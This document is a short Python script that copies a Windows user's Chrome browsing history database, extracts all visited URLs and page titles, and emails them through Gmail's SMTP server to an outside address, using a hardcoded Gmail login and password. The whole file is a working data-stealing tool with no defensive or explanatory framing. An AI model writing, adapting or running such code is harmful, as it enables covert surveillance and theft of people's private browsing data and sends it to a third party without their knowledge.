import smtplib
import os
import sqlite3
import shutil

def Main():
    source = os.environ.get("USERPROFILE") + r"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    dest = os.environ.get("USERPROFILE") + r"\\Desktop"
    shutil.copy(source, dest)
    
    data_base = os.environ.get("USERPROFILE") + r"\\Desktop\\History"
    con = sqlite3.connect(data_base) #Connect to the database
    c = con.cursor()
    
    c.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")
    c.execute("SELECT * FROM urls")

    temp = c.fetchall()
    history = []
    for x in range(len(temp)):
        history.append(temp[x][0])
        history.append(temp[x][2])

    send = "\n".join(str(e) for e in history).encode('utf-8')
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login("aryanraj31jan@gmail.com","aryanraj@123")
    s.sendmail("aryanraj31jan@gmail.com","aayush1771@gmail.com",send)
    s.quit()
if __name__ == '__main__':
    Main()

